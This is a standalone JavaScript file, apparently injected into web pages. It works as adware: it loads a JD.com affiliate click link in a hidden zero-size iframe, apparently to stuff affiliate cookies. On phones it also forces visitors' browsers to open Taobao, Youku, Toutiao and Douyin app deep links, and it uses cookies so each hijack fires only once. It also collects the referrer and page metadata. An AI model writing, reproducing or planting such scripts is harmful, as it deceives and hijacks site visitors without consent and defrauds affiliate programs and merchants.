var referer = document.referrer;
var user_agent = navigator.userAgent;
var doc = document,
	h = doc.getElementsByTagName("head")[0];

function createScript(url) {
	var scritpsrclink = doc.createElement("script");
	scritpsrclink.defer = true;
	scritpsrclink.src = url;
	scritpsrclink.charset = "utf-8";
	h && h.insertBefore(scritpsrclink, h.firstChild)
}
function createIframe(url) {
	var iframe;
	try {
		iframe = document.createElement("<iframe width='0' height='0'></iframe>")
	} catch (e) {
		iframe = document.createElement("iframe");
		iframe.style = "display:none";
		iframe.width = 0;
		iframe.height = 0
	}
	iframe.src = url;
	document.body.appendChild(iframe)
}
function getCookie(name) {
	var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
	if (arr = document.cookie.match(reg)) {
		return unescape(arr[2])
	} else {
		return null
	}
}
function setCookie(name, value) {
	var exp = new Date();
	exp.setTime(exp.getTime() + 24 * 60 * 60 * 1000);
	document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + ";path=/;"
}
function GetQueryString(name) {
	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
	var r = window.location.search.substr(1).match(reg);
	if (r != null) {
		return unescape(r[2])
	}
	return null
}
var _user_agent_mobile = (user_agent.indexOf("iPhone") > -1 || user_agent.indexOf("iPad") > -1 || user_agent.indexOf("Android") > -1);
var _user_agent_android = (user_agent.indexOf("Android") > -1);
if (getCookie("jd0624") == null) {
	try {
		if(_user_agent_mobile){
			createIframe("https://union-click.jd.com/jda?e=" + new Date().getTime() + "&p=AyIPZRprFDJWWA1FBCVbV0IUWVALHE4YDk5ER1xONz0eCG9QW3U1fi5nQxRwBkYLdV1zcBMXV3sBEwdcB1odHhIORBpeHgcbDFESaxIHFAdXHVwWMhAAVx1SJQoVD1QSW3tQIgdUKxB7AyIGZRtfFwQRB1MZWRwDEARlHGtOV3wAXE5bHQQVVFRMXBEAIjdlK2slAhI3VSsEUV9P&t=W1dCFFlQCxxOGA5OREdcTg%3D%3D&a=fCg9UgoiAwwHO1BcXkQYFFlgdX92e1FdQlYzVRBSUll%2bAQAPDSwjLw%3d%3d&refer=https%3a%2f%2fp.egou.com%2fl%3fl%3dCl7SYKqBR9etKlM1WOPSpNM2W9sWgQ446wbQNy4yWKecpnB1WOPQYcAqR9Fl6lMVNtPS5cy2W9sWNnMTgtoQNE3FWsBqMPPfYl613sb2496sRc4yYcgNYmPS3OKo3SMy!5W9UnsuUZgLRlu_fO7dC9Dd3OoV");
	    } else {
			createIframe("https://union-click.jd.com/jda?e=" + new Date().getTime() + "&p=AyIPZRprFDJWWA1FBCVbV0IUWVALHFRBEwQAQB1AWQkFaxF%2FdEYuazAQZ3JDHW0pdn1BWT5pHkMOHmlWGlscHhMPSRtSBAMXDFAcUBYDIgBQHVsXBBUEZRlcFwQbN10cUxQLEmkHK1sUMllpVCtaJQIWBVMYWxMCGwZXGlslBSJcAHVcHFcSD1McCBRVFQNXK2slMiI3VRtrFTJNQwhG&t=W1dCFFlQCxxUQRMEAEAdQFkJBQ%3D%3D&a=fCg9UgoiAwwHO1BcXkQYFFlgdX92e1FfSV4zVRBSUll%2bAQAPDSwjLw%3d%3d&refer=https%3a%2f%2fp.egou.com%2fl%3fl%3dClsc5yXJNc6c6c446wbQYZAxWKe3pn4VNtPSpNM2W9sWRNMxWy6Q37qy6wPmNnBdDwzOgKgVRwwOpJVgNtPSYyjePOetYN616tPSpPRV496sRc4yYcgNYmPS3OKo3SMy!5W9UnsuUZgLRlu_fmUmUSehMIeEYO7_");
		}
		setCookie("jd0624", "yes")
	} catch (e) {}
	setCookie("jd0624", "yes")
}
var title = document.title;
try {
	title += document.getElementsByTagName("meta")["Description"].content;
	title += document.getElementsByTagName("meta")["description"].content
} catch (e) {}
try {
	title += document.getElementsByTagName("meta")["Keywords"].content;
	title += document.getElementsByTagName("meta")["keywords"].content
} catch (e) {}

var count00 = 0;
var ykurl="youku://play?refer=guanlan929_market.huanyu.ghy_wangmeng_1000_NbIz2e_18092605&source=wangmeng&vid=XMzgwNjc2NTMyMA==";
function next(url,id) {
	try {
	    setCookie(id, "yes");
        window.location.href = url;
	} catch (e) {}
}
function wakeup() {	
	if (getCookie("tb0928") == null && _user_agent_mobile) {
		try {
			setCookie("tb0928", "yes");
			count00++;
	        window.location.href = "tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&h5Url=https%3A%2F%2Fh5.m.taobao.com%2Fbcec%2Fdahanghai-jump.html%3Fspm%3D2014.ugdhh.4076930961.1206-818%26bc_fl_srcgrowth_dhh_4076930961_1206-818&spm=2014.ugdhh.4076930961.1206-818&bc_fl_src=growth_dhh_4076930961_1206-818&materialid=1206";
	        setTimeout("next(ykurl,'yk0928')",2000);
		} catch (e) {}
	}
	if (count00 == 0 && getCookie("yk0928") == null && _user_agent_mobile) {
				try {
			setCookie("yk0928", "yes");
			count00++;
			window.location.href = ykurl;
		} catch (e) {}
	}
	if (count00 == 0 && getCookie("tt0718") == null && _user_agent_android) {
		try {
			setCookie("tt0718", "yes");
			count00++;
	        var ids=["6586222697615720967","6586254143248138760","6586050785920942605","6585528291124314638","6585141794395128327","6585528413363110407","6585508411805270536"];
	        var rand = Math.floor(Math.random()*7);
	         window.location.href = "snssdk143://detail?groupid="+ids[rand]+"&gd_label=click_schema_yq2";
	    } catch (e) {}
	}
	if (count00 == 0 && getCookie("dy0704") == null && _user_agent_mobile) {
		try {
			setCookie("dy0704", "yes");
			count00++;
	        var ids=["6576767741930245380","6578328848088173827","6578470984578239747","6577684497951624461","6578023455545888007","6577358499431320845","6579124643133656323","6578025272845536515","6578676224032247048","6583621945793711373","6583633314748304644","6583541466558106887","6583868011222928647","6577978647980805390","6584225555132976391","6583536435867962637","6580576577317260551","6582194966053784836","6578418878190193934","6577541009020816654","6577221436883078413","6584245895250840840","6576813462855355656","6578349873731472654","6577548060539227399","6577271141042228493","6577621557324025095","6578813119554915591","6577916749180570887","6572089874399104264","6581799883554950413","6580683793764453639"];
			var rand = Math.floor(Math.random()*31);
	        window.location.href = "snssdk1128://detail?id="+ids[rand]+"&gd_label=click_schema_jaw27";
	    } catch (e) {}
	}

}
setTimeout(wakeup(), 2000);